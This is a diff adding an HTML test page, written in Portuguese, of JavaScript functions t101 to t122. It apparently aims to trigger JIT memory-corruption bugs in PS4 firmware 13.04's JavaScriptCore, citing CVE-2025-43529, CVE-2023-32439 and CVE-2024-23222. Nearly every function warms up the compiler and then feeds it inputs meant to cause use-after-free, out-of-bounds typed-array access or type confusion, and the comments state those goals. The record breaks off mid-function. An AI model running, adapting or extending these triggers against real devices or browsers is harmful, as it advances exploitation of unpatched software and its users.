@@ -1,0 +1,1091 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Testes05 — CVE 2025/2024/2023 Techniques</title></head>
+<body>
+
+<p>Tecnicas diretas de CVEs recentes: CVE-2025-43529, CVE-2023-32439, CVE-2024-23222 e variantes de allocation sinking / OSR exit / TypedArray integer overflow.</p>
+<p>FW alvo: PS4 13.04 (JSC sem patch para CVEs pos-2021)</p>
+
+<button onclick="runAll()">RODAR TODOS</button>
+<br><br>
+<button onclick="t101()">Teste 101</button>
+<button onclick="t102()">Teste 102</button>
+<button onclick="t103()">Teste 103</button>
+<button onclick="t104()">Teste 104</button>
+<button onclick="t105()">Teste 105</button>
+<button onclick="t106()">Teste 106</button>
+<button onclick="t107()">Teste 107</button>
+<button onclick="t108()">Teste 108</button>
+<button onclick="t109()">Teste 109</button>
+<button onclick="t110()">Teste 110</button>
+<button onclick="t111()">Teste 111</button>
+<button onclick="t112()">Teste 112</button>
+<button onclick="t113()">Teste 113</button>
+<button onclick="t114()">Teste 114</button>
+<button onclick="t115()">Teste 115</button>
+<button onclick="t116()">Teste 116</button>
+<button onclick="t117()">Teste 117</button>
+<button onclick="t118()">Teste 118</button>
+<button onclick="t119()">Teste 119</button>
+<button onclick="t120()">Teste 120</button>
+<button onclick="t121()">Teste 121</button>
+<button onclick="t122()">Teste 122</button>
+<button onclick="t123()">Teste 123</button>
+<button onclick="t124()">Teste 124</button>
+<button onclick="t125()">Teste 125</button>
+
+<pre id="o"></pre>
+
+<script>
+function log(m){ document.getElementById('o').textContent += m + '\n'; }
+
+function runAll(){
+  log('=== RODAR TODOS: inicio ===');
+  t101(); t102(); t103(); t104(); t105();
+  t106(); t107(); t108(); t109(); t110();
+  t111(); t112(); t113(); t114(); t115();
+  t116(); t117(); t118(); t119(); t120();
+  t121(); t122(); t123(); t124(); t125();
+  log('=== RODAR TODOS: fim ===');
+}
+
+// T101 — CVE-2025-43529 variant A: Phi node allocation sinking via branch
+// DFG ObjectAllocationSinkingPhase marca Phi como escaped mas nao propaga
+// de volta para o Upsilon input em um dos branches — OSR exit usa hint stale
+function t101(){
+  log('Teste 101: inicio');
+  try {
+    function trigger(b, escape){
+      let p;
+      if(b){
+        p = { a: 1, b: 0x1337 }; // Upsilon input A
+      } else {
+        p = { a: 2, b: 0x4242 }; // Upsilon input B
+      }
+      // Phi de p acontece aqui; se escape=true, p escapa
+      if(escape) return p; // forca escape do Phi
+      return p.a;           // uso normal que sinking pode otimizar
+    }
+
+    // Warmup: escape=false, JIT constroi Phi sinkable
+    for(let i = 0; i < 0x80000; i++) trigger(i % 2 === 0, false);
+
+    // Agora forcar OSR exit com escape=true — hint stale pode usar objeto freed
+    for(let i = 0; i < 1000; i++){
+      try {
+        let r = trigger(i % 2 === 0, true);
+        // Usar o objeto retornado de forma que trigger use-after-free
+        if(r && typeof r === 'object') r.b = 0xDEAD;
+      } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 101: fim');
+}
+
+// T102 — CVE-2025-43529 variant B: loop com Phi de TypedArray + escape via closura
+// Allocation sinking de Float64Array criado dentro de loop;
+// closura captura a referencia e forca escape apos JIT ter sinkado
+function t102(){
+  log('Teste 102: inicio');
+  try {
+    let escaped = null;
+    function makeAndUse(n, doEscape){
+      let arr = new Float64Array(8); // candidato a sinking
+      arr[0] = n * 1.1;
+      arr[1] = n * 2.2;
+      if(doEscape){
+        escaped = arr; // forca escape: arr nao pode ser sinkado
+      }
+      return arr[0] + arr[1];
+    }
+
+    // Warmup sem escape
+    for(let i = 0; i < 0x60000; i++) makeAndUse(i, false);
+
+    // Pos-FTL: forcar escape periodicamente
+    for(let i = 0; i < 500; i++){
+      try {
+        makeAndUse(i, true);
+        // Tentar usar o array escapado que JIT pode ter sinkado
+        if(escaped) {
+          let v = escaped[0];
+          escaped[0] = v + 1;
+        }
+      } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 102: fim');
+}
+
+// T103 — CVE-2025-43529 variant C: OSR exit mid-loop com objeto Phi multi-branch
+// Tres branches convergem para um Phi; OSR exit no terceiro branch
+// usa hints gerados quando apenas dois branches foram vistos pelo JIT
+function t103(){
+  log('Teste 103: inicio');
+  try {
+    function multiPhi(x, mode){
+      let obj;
+      if(mode === 0){
+        obj = { x: x, tag: 'A' };
+      } else if(mode === 1){
+        obj = { x: x * 2, tag: 'B' };
+      } else {
+        obj = { x: x * 3, tag: 'C', extra: new Uint32Array(4) }; // estrutura diferente
+      }
+      // Phi de obj — modo 2 tem estrutura diferente dos outros
+      let result = obj.x;
+      if(mode === 2) result += obj.extra[0]; // acesso a campo que modos 0/1 nao tem
+      return result;
+    }
+
+    // Warmup apenas com modos 0 e 1 — JIT nao ve modo 2
+    for(let i = 0; i < 0x80000; i++) multiPhi(i, i % 2);
+
+    // Agora injetar modo 2 — OSR exit pode usar hint errado
+    for(let i = 0; i < 1000; i++){
+      try { multiPhi(i, 2); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 103: fim');
+}
+
+// T104 — CVE-2023-32439 exact: for-in + HasIndexedProperty CSE collision
+// Reproducao direta do bug: EnumeratorNextUpdateIndexAndMode e HasIndexedProperty
+// compartilham HeapLocation no DFG CSE, causando substituicao de boolean por index
+function t104(){
+  log('Teste 104: inicio');
+  try {
+    const arr = [0];
+    function jitter(){
+      for(let _ in arr){
+        return 0 in arr; // HasIndexedProperty que colide com EnumeratorNext no CSE
+      }
+    }
+    let a = jitter();
+    for(let i = 0; i < 0x100000; i++) jitter(); // tier-up DFG -> FTL
+    let b = jitter();
+    // Pos-FTL: b pode ser 0 (indice) em vez de true (boolean)
+    // Usar o valor confuso como indice de TypedArray para tentar OOB
+    try {
+      let f64 = new Float64Array(16);
+      f64[b | 0] = 3.14; // se b=0 normal; se b=numero grande, OOB
+      let r = f64[b | 0];
+    } catch(e){}
+  } catch(e){}
+  log('Teste 104: fim');
+}
+
+// T105 — CVE-2023-32439 variant: for-in com array que muda durante iteracao
+// EnumeratorNext em modo IndexedMode; array muda de Contiguous para ArrayStorage
+// durante a iteracao — mode cached pelo JIT fica obsoleto
+function t105(){
+  log('Teste 105: inicio');
+  try {
+    let arr = [1.1, 2.2, 3.3, 4.4, 5.5];
+    let mutated = false;
+
+    function iterAndCheck(){
+      for(let k in arr){
+        if(!mutated && k === '2'){
+          mutated = true;
+          // Mudar o array de Contiguous Double para ArrayStorage
+          arr[9999] = 'sparse'; // forca transicao de modo
+          delete arr[9999];
+        }
+        let has = k in arr;
+      }
+    }
+
+    // Warmup sem mutacao
+    for(let i = 0; i < 0x50000; i++){
+      mutated = false;
+      iterAndCheck();
+    }
+    // Pos-JIT: executar com mutacao
+    mutated = false;
+    for(let i = 0; i < 100; i++){
+      mutated = false;
+      try { iterAndCheck(); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 105: fim');
+}
+
+// T106 — TypedArray integer overflow na multiplicacao index * elementSize
+// CVE descrito em JSC iOS 26.2: multiplicar index por elementSize pode
+// overflow 32-bit e resultar em byteOffset que passa no check mas e OOB
+function t106(){
+  log('Teste 106: inicio');
+  try {
+    // Float64Array: elementSize = 8
+    // index = 0x20000001 -> index * 8 = 0x100000008, truncado para 0x00000008
+    // Passes bounds check (8 < byteLength) mas aponta para byte 8, nao 0x100000008
+
+    function accessWithOverflow(ta, idx){
+      return ta[idx]; // JIT deve gerar bounds check correto
+    }
+
+    const f64 = new Float64Array(16); // 128 bytes
+    for(let i = 0; i < 16; i++) f64[i] = i * 1.1;
+
+    // Warmup com indices normais
+    for(let i = 0; i < 0x80000; i++) accessWithOverflow(f64, i % 16);
+
+    // Pos-FTL: indices que podem causar overflow na multiplicacao
+    const overflowIdxs = [
+      0x20000001,  // * 8 = 0x100000008 -> trunca para 8
+      0x10000001,  // * 8 = 0x80000008  -> trunca para 8
+      0x3FFFFFFF,  // * 8 = 0x1FFFFFFF8 -> trunca para 0x1FFFFFFF8 % 2^32
+      0x7FFFFFFF,  // * 8 overflows claramente
+      0xFFFFFFFF >>> 0, // max uint32
+      0x1FFFFFFF,  // * 8 = 0xFFFFFF8 (ok)
+    ];
+
+    for(let idx of overflowIdxs){
+      try { accessWithOverflow(f64, idx); } catch(e){}
+      try { f64[idx] = 1.5; }              catch(e){}
+    }
+
+    // Mesmo teste com Uint32Array (elementSize=4)
+    const u32 = new Uint32Array(64);
+    for(let idx of overflowIdxs){
+      try { accessWithOverflow(u32, idx); } catch(e){}
+    }
+
+    // DataView com byteOffset calculado por multiplicacao
+    const buf = new ArrayBuffer(256);
+    const dv  = new DataView(buf);
+    for(let idx of overflowIdxs){
+      try { dv.getFloat64(idx * 8); }       catch(e){}
+      try { dv.getUint32((idx * 4) >>> 0); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 106: fim');
+}
+
+// T107 — DFG store barrier ausente em Phi-merged object (CVE-2025-43529 core)
+// Write barrier deve ser inserido antes de store em qualquer objeto GC-managed;
+// se o objeto passou por Phi sem propagacao de escape, o barrier pode faltar
+function t107(){
+  log('Teste 107: inicio');
+  try {
+    let sink = null;
+
+    function storeBarrierTest(condition, value){
+      let obj;
+      if(condition){
+        obj = { data: new Array(8).fill(0), version: 1 };
+      } else {
+        obj = { data: new Array(8).fill(0), version: 2 };
+      }
+      // Phi de obj
+      obj.data[0] = value; // store — precisa de write barrier se obj e GC-managed
+      obj.data[1] = value;
+
+      // Forcar GC entre stores para tentar coletar obj se barrier faltar
+      if(condition && (value % 1000 === 0)){
+        let trash = new Array(50000).fill(null).map(function(){ return {}; });
+        trash = null;
+      }
+
+      sink = obj; // escape para manter referencia
+      return obj.data[0] + obj.version;
+    }
+
+    // Warmup
+    for(let i = 0; i < 0x40000; i++) storeBarrierTest(i % 2 === 0, i);
+
+    // Pos-JIT: forcar GC durante execucao para triggerar UAF se barrier faltar
+    for(let i = 0; i < 500; i++){
+      try {
+        let r = storeBarrierTest(i % 2 === 0, i);
+        if(sink) {
+          let v = sink.data[0]; // ler objeto que pode ter sido coletado
+          sink.data[0] = v + 1;
+        }
+      } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 107: fim');
+}
+
+// T108 — FTL OSR entry com frame reconstruido de valores stale
+// Funcao entra em FTL via OSR on-entry; se valores locais foram sinkados
+// erroneamente, a reconstrucao do frame na entrada pode usar lixo de heap
+function t108(){
+  log('Teste 108: inicio');
+  try {
+    function hotLoop(n){
+      let local = { x: n, arr: new Float64Array(4) }; // candidato a sinking
+      local.arr[0] = n * 1.1;
+
+      // Loop que leva ao OSR entry quando atingir threshold
+      let sum = 0;
+      for(let i = 0; i < n; i++){
+        sum += local.arr[0]; // acesso ao objeto potencialmente sinkado
+        local.arr[0] += 0.1;
+      }
+      return sum + local.x;
+    }
+
+    // Chamadas curtas primeiro (sem tier-up dentro do loop)
+    for(let i = 0; i < 1000; i++) hotLoop(10);
+
+    // Agora chamada longa — OSR entry acontece DENTRO do loop
+    try { hotLoop(100000); } catch(e){}
+
+    // Variacoes que trocam o tipo de local.x apos JIT
+    function hotLoop2(n, extra){
+      let local = { x: n, tag: 'base' };
+      let sum = 0;
+      for(let i = 0; i < 200; i++){
+        sum += local.x;
+        if(i === 100 && extra) local.x = { valueOf(){ return 99; } }; // muda tipo no meio
+      }
+      return sum;
+    }
+    for(let i = 0; i < 0x10000; i++) hotLoop2(i, false);
+    try { hotLoop2(1, true); } catch(e){}
+  } catch(e){}
+  log('Teste 108: fim');
+}
+
+// T109 — Butterfly pointer aliasing via duplo Proxy que muda estrutura
+// JSC usa butterfly para armazenar propriedades e elementos de array;
+// mudar o prototype de um objeto JIT-compilado pode causar butterfly invalido
+function t109(){
+  log('Teste 109: inicio');
+  try {
+    class FastObj {
+      constructor(n){
+        this.a = n;
+        this.b = n * 2;
+        this.c = n * 3;
+      }
+    }
+
+    function readABC(o){ return o.a + o.b + o.c; }
+
+    const objs = [];
+    for(let i = 0; i < 100; i++) objs.push(new FastObj(i));
+
+    // Warmup: JIT inline cache aprende estrutura de FastObj
+    for(let i = 0; i < 0x40000; i++) readABC(objs[i % 100]);
+
+    // Mudar prototype de um objeto — invalida butterfly e estrutura
+    const victim = objs[42];
+    const fakeProto = {
+      get a(){ return 0xDEAD; },
+      get b(){ return 0xBEEF; },
+      get c(){ return 0xCAFE; }
+    };
+    Object.setPrototypeOf(victim, fakeProto);
+
+    // Apagar as propriedades proprias do victim — agora usa getters do proto
+    try { delete victim.a; } catch(e){}
+    try { delete victim.b; } catch(e){}
+    try { delete victim.c; } catch(e){}
+
+    // JIT deve fazer OSR exit ou revalidar IC; se nao fizer, le butterfly errado
+    for(let i = 0; i < 1000; i++){
+      try { readABC(victim); } catch(e){}
+      try { readABC(objs[i % 100]); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 109: fim');
+}
+
+// T110 — DFG AbstractInterpreter range analysis com valor negativo como unsigned
+// B3 ReduceStrength pode tratar Int32 negativo como unsigned em comparacoes;
+// bounds check que usa esse range pode ser eliminado incorretamente
+function t110(){
+  log('Teste 110: inicio');
+  try {
+    const SIZE = 128;
+    const arr = new Int32Array(SIZE);
+    for(let i = 0; i < SIZE; i++) arr[i] = i;
+
+    // Funcao com bounds check que B3 pode tentar provar redundante
+    function readClamped(base, delta){
+      let idx = (base + delta) | 0;
+      // B3 pode ver: base in [0, SIZE-1], delta in [-1, 0] -> idx in [-1, SIZE-1]
+      // Se B3 trata -1 como large unsigned, elimina bounds check erroneamente
+      if(idx < 0) idx = 0;
+      if(idx >= SIZE) idx = SIZE - 1;
+      return arr[idx];
+    }
+
+    // Warmup: base sempre positivo, delta sempre 0 ou -1
+    for(let i = 0; i < 0x100000; i++) readClamped(i % SIZE, (i % 2) - 1);
+
+    // Pos-FTL: injetar combinacoes que quebram o range assumido
+    const cases = [
+      [0, -1], [0, -2], [1, -2],
+      [SIZE - 1, 1], [SIZE, 0], [SIZE, 1],
+      [-1, 0], [-2, 1],
+      [0x7FFFFFFF, 1], [-0x80000000, -1],
+      [0x3FFF, 0x3FFF], // soma pode overflow
+    ];
+    for(let [b, d] of cases){
+      try { readClamped(b, d); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 110: fim');
+}
+
+// T111 — Inline cache: get_by_id com getter que muda o proprio receiver durante get
+// IC assume que getter retorna valor sem modificar o objeto base;
+// getter que deleta a propriedade que esta sendo acessada pode confundir IC
+function t111(){
+  log('Teste 111: inicio');
+  try {
+    let accessCount = 0;
+    function makeTrap(){
+      const o = {};
+      Object.defineProperty(o, 'val', {
+        get: function(){
+          accessCount++;
+          if(accessCount === 1000){
+            // Deletar a propriedade enquanto IC esta tentando le-la
+            delete o.val;
+            // Adicionar propriedade normal com mesmo nome
+            o.val = 0xDEAD;
+          }
+          return 42;
+        },
+        configurable: true, enumerable: true
+      });
+      return o;
+    }
+
+    const trap = makeTrap();
+
+    function getVal(o){ return o.val; }
+
+    // Warmup com objeto simples (IC monomorphic para slot simples)
+    const simple = { val: 1 };
+    for(let i = 0; i < 0x30000; i++) getVal(simple);
+
+    // Agora misturar com trap que tem getter
+    for(let i = 0; i < 2000; i++){
+      try { getVal(trap); }   catch(e){}
+      try { getVal(simple); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 111: fim');
+}
+
+// T112 — FTL: Funcao com multiplos OSR exit points e Phi de diferentes tipos
+// Phi que pode ser Int32, Double ou Boolean dependendo do branch;
+// FTL pode especializar para um tipo e crash ao receber outro
+function t112(){
+  log('Teste 112: inicio');
+  try {
+    function typePhi(x, mode){
+      let result;
+      if(mode === 0){
+        result = x | 0;          // Int32
+      } else if(mode === 1){
+        result = x * 1.5;        // Double
+      } else if(mode === 2){
+        result = x > 0;          // Boolean
+      } else {
+        result = 'str' + x;      // String — tipo que FTL nao esperava
+      }
+      // Phi de result — FTL especializa para o(s) tipo(s) visto(s) no warmup
+      return result + 0; // forca conversao numerica do Phi
+    }
+
+    // Warmup so com Int32 e Double
+    for(let i = 0; i < 0x80000; i++) typePhi(i, i % 2);
+
+    // Pos-FTL: injetar Boolean e String — OSR exit com tipo inesperado
+    for(let i = 0; i < 1000; i++){
+      try { typePhi(i, 2); } catch(e){} // Boolean
+      try { typePhi(i, 3); } catch(e){} // String
+    }
+  } catch(e){}
+  log('Teste 112: fim');
+}
+
+// T113 — StructureID spoofing via muitos Objects criados e destruidos
+// JSC recicla StructureIDs; criar/destruir muitas estruturas diferentes
+// pode fazer com que um StructureID seja reutilizado para tipo errado
+function t113(){
+  log('Teste 113: inicio');
+  try {
+    // Criar muitas estruturas unicas (cada objeto com props diferentes tem estrutura propria)
+    const dead = [];
+    for(let i = 0; i < 5000; i++){
+      const o = {};
+      o['prop_' + i] = i;         // estrutura unica por objeto
+      o['extra_' + i] = i * 2;
+      dead.push(o);
+    }
+
+    // Soltar as referencias — GC pode coletar e reciclar StructureIDs
+    dead.length = 0;
+    let trash = new Array(100000).fill(null).map(function(){ return { x: 1 }; });
+    trash = null;
+
+    // Criar novos objetos que podem ter StructureID reciclado
+    const fresh = [];
+    for(let i = 0; i < 1000; i++){
+      const o = { a: i, b: i * 2 };
+      fresh.push(o);
+    }
+
+    // Funcao JIT que assume estrutura dos objetos fresh
+    function readAB(o){ return o.a + o.b; }
+    for(let i = 0; i < 0x20000; i++) readAB(fresh[i % 1000]);
+
+    // Tentar confundir estrutura misturando objetos velhos e novos
+    for(let i = 0; i < 1000; i++){
+      const confused = {};
+      confused['prop_' + i] = i;  // mesma chave dos objetos mortos
+      try { readAB(confused); } catch(e){} // estrutura incorreta para readAB
+    }
+  } catch(e){}
+  log('Teste 113: fim');
+}
+
+// T114 — DFG: Array.prototype.pop JIT com getter em length que retorna objeto
+// pop le .length, depois armazena .length - 1; se getter retorna objeto,
+// ToUint32(objeto) pode retornar 0 e pop remove elemento errado
+function t114(){
+  log('Teste 114: inicio');
+  try {
+    function popAndUse(arr){
+      let v = arr.pop();
+      return v;
+    }
+
+    // Warmup com array normal
+    const normal = [1, 2, 3, 4, 5];
+    for(let i = 0; i < 0x20000; i++){
+      if(normal.length < 2) normal.push(normal.length);
+      popAndUse(normal);
+    }
+
+    // Agora: array com getter em .length que retorna objeto
+    const trap = [10, 20, 30, 40, 50];
+    let lenGetCount = 0;
+    Object.defineProperty(trap, 'length', {
+      get: function(){
+        lenGetCount++;
+        if(lenGetCount % 3 === 0){
+          return { valueOf(){ return 5; } }; // objeto, nao numero
+        }
+        return 5;
+      },
+      set: function(v){},
+      configurable: true
+    });
+
+    for(let i = 0; i < 500; i++){
+      try { popAndUse(trap); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 114: fim');
+}
+
+// T115 — CVE-2024-23222 variant: JIT switch com objeto cujo valueOf muda identidade
+// JIT compila switch como jump table para constantes inteiras;
+// objeto com valueOf que retorna indices crescentes pode "navegar" pela tabela
+function t115(){
+  log('Teste 115: inicio');
+  try {
+    function dispatchSwitch(v){
+      switch(v){
+        case 0:  return new Uint8Array(1);
+        case 1:  return new Uint16Array(1);
+        case 2:  return new Uint32Array(1);
+        case 3:  return new Float32Array(1);
+        case 4:  return new Float64Array(1);
+        case 5:  return new Int8Array(1);
+        case 6:  return new Int16Array(1);
+        case 7:  return new Int32Array(1);
+        default: return null;
+      }
+    }
+
+    // Warmup com inteiros 0-7
+    for(let i = 0; i < 0x80000; i++) dispatchSwitch(i % 8);
+
+    // Objeto cujo valueOf avanca pelo switch a cada chamada
+    let vcount = 0;
+    const walker = {
+      valueOf(){ return vcount++ % 9; } // inclui default (8)
+    };
+
+    for(let i = 0; i < 1000; i++){
+      try {
+        let ta = dispatchSwitch(walker);
+        if(ta) ta[0] = 0xFF; // escrever no TypedArray retornado
+      } catch(e){}
+    }
+
+    // Versao com valueOf que retorna valor fora de range
+    const oob = {
+      valueOf(){ return (vcount++ % 3 === 0) ? -1 : 0x7FFFFFFF; }
+    };
+    for(let i = 0; i < 500; i++){
+      try { dispatchSwitch(oob); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 115: fim');
+}
+
+// T116 — FTL abstract heap: duas funcoes JIT acessam o mesmo objeto concorrentemente
+// via Promise microtask que modifica o objeto entre dois acessos JIT
+function t116(){
+  log('Teste 116: inicio');
+  try {
+    const shared = { val: 0, arr: new Float64Array(8) };
+
+    function reader(o){ return o.arr[0] + o.val; }
+    function writer(o, v){ o.arr[0] = v; o.val = v; }
+
+    // Warmup de reader e writer
+    for(let i = 0; i < 0x30000; i++){
+      writer(shared, i * 0.1);
+      reader(shared);
+    }
+
+    // Agora intercalar via Promise microtask
+    let done = false;
+    async function concurrent(){
+      for(let i = 0; i < 500 && !done; i++){
+        writer(shared, i);
+        await Promise.resolve(); // yield para microtask queue
+        let r = reader(shared); // outro acesso JIT pos-yield
+        await Promise.resolve();
+        // Mudar tipo do arr.arr entre yields
+        if(i === 100){
+          shared.arr = new Int32Array(8); // trocar tipo do TypedArray
+        }
+        if(i === 200){
+          shared.arr = new Float64Array(8); // voltar
+        }
+      }
+      done = true;
+    }
+    concurrent().catch(function(){});
+  } catch(e){}
+  log('Teste 116: fim');
+}
+
+// T117 — RegExp backreference com JIT: \1 referencia grupo que pode ser undefined
+// JIT pode assumir que backreference sempre faz match;
+// grupo opcional (?:(...))? deixa \1 como undefined
+function t117(){
+  log('Teste 117: inicio');
+  try {
+    // Regex com grupo opcional — \1 pode ser undefined se grupo nao capturou
+    const re1 = /^(?:(a+))?\1b$/;
+    const re2 = /(\w+)\s+\1/g; // backreference normal
+    const re3 = /^(a?)(\1)b$/;  // \2 referencia \1 que pode ser vazio
+
+    function testRe(re, s){ return re.test(s); }
+
+    // Warmup com re2 (sempre tem match)
+    const strs = ['hello hello', 'world world', 'foo foo', 'bar bar'];
+    for(let i = 0; i < 0x20000; i++) testRe(re2, strs[i % 4]);
+
+    // Agora misturar com re1 e re3 (grupos opcionais)
+    const cases1 = ['b', 'ab', 'aab', 'aaab', 'b', 'x'];
+    const cases3 = ['b', 'ab', 'aab', 'aaab'];
+    for(let i = 0; i < 1000; i++){
+      try { testRe(re1, cases1[i % cases1.length]); } catch(e){}
+      try { testRe(re3, cases3[i % cases3.length]); } catch(e){}
+    }
+
+    // RegExp.exec com grupos nomeados e backreference de nome
+    const re4 = /(?<word>\w+)\s+\k<word>/g;
+    for(let i = 0; i < 0x20000; i++) re4.lastIndex = 0, re4.exec('test test');
+    // Grupo nomeado em alternation — pode nao capturar em um branch
+    const re5 = /(?:(?<x>a)|(?<y>b))\k<x>/;
+    for(let i = 0; i < 500; i++){
+      try { re5.test('aa'); } catch(e){}
+      try { re5.test('b'); }  catch(e){}
+      try { re5.test('ba'); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 117: fim');
+}
+
+// T118 — JSC WeakMap com chave que e coletada durante lookup
+// WeakMap usa identidade do objeto como chave; se GC coleta a chave
+// enquanto has/get esta em progresso, pode haver UAF no lookup
+function t118(){
+  log('Teste 118: inicio');
+  try {
+    const wm = new WeakMap();
+
+    // Criar chaves e registrar no WeakMap
+    function populate(count){
+      const keys = [];
+      for(let i = 0; i < count; i++){
+        const key = { id: i, data: new Uint32Array(16) };
+        wm.set(key, i * 100);
+        keys.push(key);
+      }
+      return keys;
+    }
+
+    let keys = populate(500);
+
+    // Funcao JIT que faz lookups no WeakMap
+    function lookup(k){ return wm.has(k) ? wm.get(k) : -1; }
+    for(let i = 0; i < 0x20000; i++) lookup(keys[i % 500]);
+
+    // Soltar metade das chaves e forcar GC
+    for(let i = 0; i < 250; i++) keys[i] = null;
+    let trash = new Array(200000).fill(null).map(function(){ return { x: Math.random() }; });
+    trash = null;
+
+    // Lookup nas chaves restantes (algumas ja podem ter sido coletadas)
+    for(let i = 0; i < 500; i++){
+      const k = keys[i % 500];
+      try {
+        if(k) lookup(k);
+      } catch(e){}
+    }
+
+    // WeakSet com mesma tecnica
+    const ws = new WeakSet();
+    let setKeys = populate(100);
+    setKeys.forEach(function(k){ ws.add(k); });
+    setKeys.slice(0, 50).forEach(function(_,i){ setKeys[i] = null; });
+    trash = new Array(100000).fill(null).map(function(){ return {}; });
+    trash = null;
+    setKeys.forEach(function(k){ try { ws.has(k); } catch(e){} });
+  } catch(e){}
+  log('Teste 118: fim');
+}
+
+// T119 — Intl.DateTimeFormat.format com valueOf hook (CVE-2017-2446 pattern)
+// format() chama valueOf no argumento Date; se valueOf retorna funcao
+// que captura o formatter e chama format() novamente, pode ter reentrada
+function t119(){
+  log('Teste 119: inicio');
+  try {
+    if(typeof Intl === 'undefined' || typeof Intl.DateTimeFormat === 'undefined'){
+      throw new Error('sem Intl.DateTimeFormat');
+    }
+
+    const fmt = new Intl.DateTimeFormat('en-US', {
+      year: 'numeric', month: 'short', day: 'numeric',
+      hour: '2-digit', minute: '2-digit'
+    });
+
+    let reentryCount = 0;
+    const evilDate = {
+      valueOf: function(){
+        reentryCount++;
+        if(reentryCount < 5){
+          // Reentrada: chamar fmt.format enquanto fmt.format esta em execucao
+          try { fmt.format(new Date()); }   catch(e){}
+          try { fmt.format(evilDate); }     catch(e){} // recursao real
+        }
+        return Date.now();
+      }
+    };
+
+    for(let i = 0; i < 0x10000; i++) fmt.format(new Date(i * 86400000));
+
+    // Agora com evilDate
+    for(let i = 0; i < 100; i++){
+      reentryCount = 0;
+      try { fmt.format(evilDate); } catch(e){}
+    }
+
+    // Intl.NumberFormat com mesmo padrao
+    const nfmt = new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' });
+    const evilNum = {
+      valueOf: function(){
+        try { nfmt.format(evilNum); } catch(e){}
+        return 42.5;
+      }
+    };
+    for(let i = 0; i < 100; i++){
+      try { nfmt.format(evilNum); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 119: fim');
+}
+
+// T120 — JSC GetByVal com string index JIT: acesso a array com chave string numerica
+// JIT especializa GetByVal para Int32 index; chave '0' e '00' sao diferentes
+// '0' acessa indice 0; '00' acessa propriedade nomeada — IC pode confundir
+function t120(){
+  log('Teste 120: inicio');
+  try {
+    const arr = [10, 20, 30, 40, 50];
+    arr['00']  = 'named_double_zero';
+    arr['0x1'] = 'named_hex';
+    arr[' 1']  = 'named_space';
+    arr['1.0'] = 'named_float';
+
+    function getByKey(a, k){ return a[k]; }
+
+    // Warmup com inteiros
+    for(let i = 0; i < 0x30000; i++) getByKey(arr, i % 5);
+
+    // Misturar com string keys
+    const strKeys = ['0', '1', '2', '00', '0x1', ' 1', '1.0', '-1', '1e0',
+                     '4294967295', '4294967296', '-0'];
+    for(let i = 0; i < 2000; i++){
+      try { getByKey(arr, strKeys[i % strKeys.length]); } catch(e){}
+    }
+
+    // TypedArray com mesmas chaves (TypedArray ignora string keys nao-canonicas)
+    const ta = new Uint32Array(5);
+    for(let i = 0; i < 5; i++) ta[i] = i * 0x11111111;
+    for(let i = 0; i < 1000; i++){
+      try { getByKey(ta, strKeys[i % strKeys.length]); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 120: fim');
+}
+
+// T121 — DFG: funcao generica que JIT especializa; depois recebe subclasse
+// JIT ve instancias de Base e inline cache para Base.prototype.method;
+// receber instancia de Derived (que sobrescreve method) invalida o IC
+function t121(){
+  log('Teste 121: inicio');
+  try {
+    class Base {
+      constructor(n){ this.n = n; this.buf = new Float64Array(4); }
+      method(){ return this.n * 2; }
+      getN(){ return this.n; }
+    }
+
+    class Derived extends Base {
+      constructor(n){ super(n); this.extra = n * 3; }
+      method(){ return this.n * 3 + this.extra; } // sobrescreve
+    }
+
+    class DeepDerived extends Derived {
+      method(){ return super.method() + 1; } // chain de super
+    }
+
+    function callMethod(o){ return o.method(); }
+
+    // Warmup: apenas Base
+    const bases = new Array(100).fill(null).map(function(_, i){ return new Base(i); });
+    for(let i = 0; i < 0x40000; i++) callMethod(bases[i % 100]);
+
+    // Injetar Derived — IC bimorphic
+    const deriveds = new Array(50).fill(null).map(function(_, i){ return new Derived(i); });
+    for(let i = 0; i < 0x10000; i++) callMethod(deriveds[i % 50]);
+
+    // Injetar DeepDerived — IC megamorphic
+    const deeps = new Array(50).fill(null).map(function(_, i){ return new DeepDerived(i); });
+    for(let i = 0; i < 5000; i++){
+      try { callMethod(deeps[i % 50]); }    catch(e){}
+      try { callMethod(bases[i % 100]); }   catch(e){}
+      try { callMethod(deriveds[i % 50]); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 121: fim');
+}
+
+// T122 — JSC JSPromise: resolver com thenable que lanca no then
+// Spec: then e chamado em microtask; se lanca, promise fica rejected
+// Cadeia complexa de thenables com excecao em posicoes especificas
+function t122(){
+  log('Teste 122: inicio');
+  try {
+    function makeThenable(shouldThrow, value, depth){
+      return {
+        then: function(resolve, reject){
+          if(shouldThrow){
+            throw new TypeError('thenable_throws_in_then_' + depth);
+          }
+          if(depth > 0){
+            resolve(makeThenable(depth % 3 === 0, value, depth - 1));
+          } else {
+            resolve(value);
+          }
+        }
+      };
+    }
+
+    // Cadeia de 50 thenables onde alguns lancam
+    const chain = makeThenable(false, 'final', 50);
+    Promise.resolve(chain).then(function(){}).catch(function(){});
+
+    // Thenable que lanca no nivel 10
+    const chainThrows = makeThenable(false, 'val', 20);
+    Promise.resolve(chainThrows).then(function(){}).catch(function(){});
+
+    // Thenable cujo then chama resolve multiplas vezes
+    const multiResolve = {
+      then: function(resolve, reject){
+        resolve(1);
+        resolve(2); // deve ser ignorado
+        resolve(3); // deve ser ignorado
+        reject(new Error('late_reject')); // deve ser ignorado
+      }
+    };
+    Promise.resolve(multiResolve).then(function(){}).catch(function(){});
+
+    // Thenable que chama resolve com outro thenable que chama reject
+    let depth2 = 0;
+    const recursive = {
+      then: function(resolve, reject){
+        depth2++;
+        if(depth2 > 100) return resolve('stop');
+        resolve({
+          then: function(r2){ r2(recursive); } // ciclo de thenables
+        });
+      }
